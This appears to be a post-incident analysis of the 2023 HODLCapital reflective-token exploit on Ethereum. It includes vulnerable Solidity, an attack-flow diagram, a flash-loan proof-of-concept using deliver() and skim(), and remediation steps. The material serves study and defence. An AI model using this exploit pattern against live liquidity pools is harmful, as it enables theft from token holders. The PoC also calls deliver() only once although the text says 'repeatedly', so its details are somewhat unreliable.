# HODLCapital — Reflective Token `deliver()` Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-12 |
| **Protocol** | HODLCapital |
| **Chain** | Ethereum |
| **Loss** | ~2.3 ETH |
| **Attacker** | [0x4e998316...](https://etherscan.io/address/0x4e998316ec31d2f3078f8f57b952bfae54728be1) |
| **Attack Contract** | [0x6943e74d...](https://etherscan.io/address/0x6943e74d1109a728f25a2e634ba3d74e9e476aed) |
| **Attack Tx** | [0xedc214a6...](https://etherscan.io/tx/0xedc214a62ff6fd764200ddaa8ceae54f842279eadab80900be5f29d0b75212df) |
| **Vulnerable Contract** | [0xEdA47E13...](https://etherscan.io/address/0xEdA47E13fD1192E32226753dC2261C4A14908fb7) |
| **Root Cause** | Reflective token `deliver()` call induces LP reserve imbalance, exploited via `skim()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/HODLCapital_exp.sol) |

---
## 1. Vulnerability Overview

The HODL token implements a reflective mechanism whereby calling `deliver()` to burn tokens distributes reflection rewards to the remaining holders. The LP pair is not excluded from this reflection mechanism, so when `deliver()` is called, the LP pair's actual token balance increases but UniswapV2's internal reserves are not updated. This imbalance can be drained via `skim()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Reflective deliver(): LP pair is not excluded
function deliver(uint256 tAmount) public {
    address sender = _msgSender();
    require(!_isExcluded[sender], "Excluded addresses cannot call this function");
    (uint256 rAmount,,,,) = _getValues(tAmount);
    _rOwned[sender] -= rAmount;
    _rTotal -= rAmount;       // ❌ Total reflection pool decreases → LP pair's rOwned share increases
    _tFeeTotal += tAmount;
    // ❌ LP pair's reserve is not updated
    // UniswapV2 pair.reserve0 < pair.balanceOf(address(pair)) imbalance occurs
}
```

```solidity
// ✅ Fix: Add LP pair to excluded list, or call sync() after deliver
function deliver(uint256 tAmount) public {
    // Set LP pair as excluded to remove it from reflections
    // Or call IUniswapV2Pair(lpPair).sync() after deliver
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: HODLCapital.sol
  function getReserves()  // ❌

// ...

  function quote(

// ...

  function getAmountOut(

// ...

  function getAmountIn(

// ...

  function deliver(uint256 tAmount) public {  // ❌
    address sender = _msgSender();
    require(
      !_isExcluded[sender],
      "Excluded addresses cannot call this function"
    );
    (uint256 rAmount, , , , , ) = _getValues(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _rTotal = _rTotal.sub(rAmount);
    _tFeeTotal = _tFeeTotal.add(tAmount);
  }
```

## 3. Attack Flow

```
┌─────────────────────────────────────┐
│  1. Borrow 1000 WETH via Aave       │
│     flash loan                      │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  2. Swap WETH → HODL (bulk buy)     │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  3. Call HODL.deliver() repeatedly  │
│     → LP pair's reflection balance  │
│       increases                     │
│     → reserve vs balance imbalance  │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  4. hodl_weth.skim(attacker)        │
│     → Drain excess HODL tokens      │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  5. Sell HODL → WETH                │
│  6. Repay flash loan + take profit  │
└─────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() external {
    // 1. Borrow 1000 WETH via Aave flash loan
    address[] memory assets = new address[](1);
    assets[0] = address(weth);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = amount1000;
    aavePool.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
}

function executeOperation(
    address[] calldata,
    uint256[] calldata,
    uint256[] calldata,
    address,
    bytes calldata
) external returns (bool) {
    // 2. Buy HODL with WETH
    weth.approve(address(router), type(uint256).max);
    swapWETHToHODL(amount1000);

    uint256 hodlBalance = hodl.balanceOf(address(this));

    // 3. Call deliver() repeatedly to create LP reserve imbalance
    hodl.approve(address(hodl), hodlBalance);
    hodl.deliver(hodlBalance / 2);  // LP pair's reflection balance increases

    // 4. Drain excess balance via skim()
    hodl_weth.skim(address(this));

    // 5. Sell remaining HODL → WETH
    swapHODLToWETH(hodl.balanceOf(address(this)));

    // 6. Repay flash loan
    weth.approve(address(aavePool), type(uint256).max);
    return true;
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Reflective deliver/skim | HIGH | CWE-682 | 07_token_integration.md |
| V-02 | LP reserve imbalance | HIGH | CWE-664 | 16_accounting_sync.md |

### V-01: Reflective deliver/skim
- **Description**: When `deliver()` is called, the LP pair's reflection balance increases but UniswapV2 reserves are not updated, causing an imbalance
- **Impact**: Excess token theft via `skim()`
- **Attack Conditions**: Attacker holds reflective tokens; LP pair is included in the reflection list

## 6. Remediation Recommendations

### Immediate Action
```solidity
// Add LP pair to excluded list
function addLiquidityPair(address pair) external onlyOwner {
    _isExcluded[pair] = true;  // ✅ Exclude from reflections
    _excluded.push(pair);
}
```

### Structural Improvements
| Vulnerability | Recommended Action |
|--------|-----------|
| LP reflection imbalance | Register LP pair as excluded |
| deliver abuse | Automatically call `sync()` after deliver |
| skim attack | Disable `skim()` or restrict access |

## 7. Lessons Learned

1. Reflective tokens used alongside UniswapV2 LP pairs must always register the LP pair in the excluded list.
2. The same pattern has been repeated in BEVO, BRA, SELLC, and others — a standard checklist should be applied when designing reflective tokens.
3. Unlike `burn()`, the `deliver()` function does not reduce total supply; it only modifies the reflection ratio, making LP imbalances easier to trigger.